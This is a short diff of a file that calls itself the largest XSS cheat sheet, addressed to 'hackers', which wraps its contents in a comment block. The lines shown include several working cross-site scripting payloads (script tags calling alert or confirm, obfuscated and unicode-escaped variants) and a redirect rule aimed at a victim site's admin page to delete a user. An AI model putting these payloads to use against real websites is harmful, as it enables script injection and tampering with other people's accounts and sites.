@@ -2,7 +2,7 @@
 HEY HACKERS. HERE YOU GO. THE LARGEST XSS CHEAT SHEET
 XSS WORKING COMMANDS
 ---------------------------------------------
-<script /**/>/**/alert(1)/**/</script /**/
+/** <script /**/>/**/alert(1)/**/</script /**/
 <script>alert("alert")</script>
 <script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
 <script ~~~>alert(0%0)</script ~~~>
@@ -2189,3 +2189,4 @@ Redirect 302 /a&#46;jpg http&#58;//victimsite&#46;com/admin&#46;asp&deleteuser
 \x3C
 \u003c
 \u003C
+**/
